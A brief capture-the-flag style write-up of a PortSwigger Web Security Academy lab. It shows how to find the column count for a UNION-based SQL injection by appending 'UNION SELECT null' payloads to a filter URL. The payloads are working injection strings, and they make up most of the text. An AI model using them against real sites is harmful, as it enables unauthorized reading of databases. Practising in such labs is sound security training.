# URL
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
# Concept
* enumerating number of columns in original query for UNION select SQL injection
# Method of solve
* click on any of the filters in the search page of the web app
* put this payload at the end of the URL
```
' UNION SELECT null -- -
```
* we observe that this results in an error
* test for two columns:
```
' UNION SELECT null,null -- -
```
* also results in an error
* test for three columns
```
' UNION SELECT null,null,null -- -
```
* this returns data from the app, solving the challenge
